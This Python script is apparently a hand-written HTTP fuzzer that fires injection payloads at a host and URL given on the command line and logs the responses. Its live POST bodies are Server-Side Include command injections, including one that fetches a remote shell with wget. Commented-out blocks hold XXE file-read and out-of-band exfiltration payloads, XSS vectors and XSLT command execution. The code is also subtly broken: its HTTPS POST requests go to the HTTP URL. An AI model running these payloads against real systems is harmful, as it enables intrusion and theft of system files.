#!/usr/bin/env python3

# HTTP headers fuzzer
# args: url
import requests
import sys
import os

logfile = open('fuzzer.log', 'w')

payloads = [
    {
        "Content-Type": "text/plain",
        "User-Agent": "HTTP Fuzzer",
        "Accept": "*.*"
    },
    {
        "Content-Type": "application/xml",
        "User-Agent": "",
        "Accept": "*.*"
    },
    {
        "Content-Type": "application/json",
        "Accept": "*.*",
        "User-Agent": "';",
    },
    # {
    #     "Host": sys.argv[1],
    #     "Content-Type": "image/jpeg",
    #     "Accept": "*.*",
    #     "User-Agent": '";-- - '
    # }
]

postdata = [
    # text/plain
    "some random string",
    # application/x-www-form-urlencoded
    "foo=bar&debug=true",
    # application/xml
    r"""
<?xml version="1.0"?>
<catalog>
<book id="bk101">
<author>Gambardella, Matthew</author>
<title>XML Developer's Guide</title>
<genre>Computer</genre>
<price>44.95</price>
<publish_date>2000-10-01</publish_date>
<description>An in-depth look at creating applications 
with XML.</description>
</book>
</catalog>
    """,
    # application/json
    r"""
{"id":"10", "username":"admin","token":"somerandomtoken"}
    """,
    # some SSI
    r"""
<pre><!--#exec cmd="ls" --></pre>
<pre><!--#echo var="DATE_LOCAL" --> </pre>
<pre><!--#exec cmd="whoami"--></pre>
<pre><!--#exec cmd="dir" --></pre>
<!--#exec cmd="ls" -->
<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
<!--#exec cmd="/bin/ls /" -->
<!--#exec cmd="dir" -->
<!--#exec cmd="cd C:\WINDOWS\System32">
<!--#config errmsg="File not found, informs users and password"-->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#config timefmt="A %B %d %Y %r"-->
<!--#fsize file="ssi.shtml" -->
<!--#include file=?UUUUUUUU...UU?-->
<!--#echo var="DATE_LOCAL" --> 
<!--#exec cmd="whoami"--> 
<!--#printenv -->
<!--#flastmod virtual="echo.html" -->
<!--#echo var="auth_type" -->
<!--#echo var="http_referer" -->
<!--#echo var="content_length" -->
    """,
    #     r"""
    # <![CDATA[<script>var n=0;while(true){n++;}</script>]]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
    # <!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
    # ]>
    # <!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
    # ]>
    # "<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
    # "<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    # "<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
    # "<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
    # <name>','')); phpinfo(); exit;/*</name>

    #     """,
    # XXE
    #     r"""
    #     <!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
    # <?xml version="1.0" encoding="ISO-8859-1"?>
    # <!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
    # <!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
    # <?xml version="1.0" encoding="ISO-8859-1"?><test></test>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
    # <test></test>
    # <![CDATA[<test></test>]]>
    # &foo;
    # %foo;
    # count(/child::node())
    # x' or name()='username' or 'x'='y
    # <name>','')); phpinfo(); exit;/*</name>
    # <![CDATA[<script>var n=0;while(true){n++;}</script>]]>
    # <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
    # <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
    # <foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
    # <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
    # <foo><![CDATA[' or 1=1 or ''=']]></foo>
    # <xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
    # <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
    # <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
    # <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
    # <xml SRC="xsstest.xml" ID=I></xml>
    # <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
    # <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
    # <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
    # <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
    # <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
    # <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    # <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
    # <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
    # <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
    # <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
    # <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
    # <!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
    # <!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
    # <!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
    # <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
    #     """
]


def pretty_response_print(method, url, response):
    if 'Content-Length' in response.headers.keys():
        content_length = response.headers['Content-Length']
    else:
        content_length = 'unknown'
        
    print("{} {}\t\t HTTP {}: size: {}".format(
        method, url, response.status_code, content_length))
    logfile.write('RESPONSE HEADERS:\n{}\nRESPONSE BODY:\n{}\n{}\n\n'.format(
        response.headers.__str__(), response.text, '-' * 120))


def send_request_with_method(method, url, payload):
    http_url = "http://{}".format(url)
    https_url = "https://{}".format(url)
    if method == 'GET':
        data = ''
        logfile.write('##########  {} --> {}\nREQUEST HEADERS: {}\nREQUEST BODY: {}\n\n'.format(method,
                                                                                                http_url, payload.__str__(), data.__str__()))
        pretty_response_print(method, http_url, requests.get(
            http_url, headers=payload, allow_redirects=False))

        logfile.write('##########  {} --> {}\nREQUEST HEADERS: {}\nREQUEST BODY: {}\n\n'.format(method,
                                                                                                https_url, payload.__str__(), data.__str__()))
        pretty_response_print(method, https_url, requests.get(
            https_url, headers=payload, allow_redirects=False))

    if method == 'POST':
        for data in postdata:
            logfile.write('##########  {} --> {}\nREQUEST HEADERS: {}\nREQUEST BODY: {}\n\n'.format(method,
                                                                                                    http_url, payload.__str__(), data.__str__()))
            pretty_response_print(method, http_url, requests.post(
                http_url, headers=payload, data=data, allow_redirects=False))

            logfile.write('##########  {} --> {}\nREQUEST HEADERS: {}\nREQUEST BODY: {}\n\n'.format(method,
                                                                                                    https_url, payload.__str__(), data.__str__()))
            pretty_response_print(method, https_url, requests.post(
                http_url, headers=payload, data=data, allow_redirects=False))


def fuzz(host, url):
    print("[+] Fuzzing {}...".format(url))

    for payload in payloads:
        payload["Host"] = host
        send_request_with_method('GET', url, payload)
        send_request_with_method('POST', url, payload)


if __name__ == '__main__':
    host = sys.argv[1]
    url = sys.argv[2]

    fuzz(host, url)
    logfile.close()
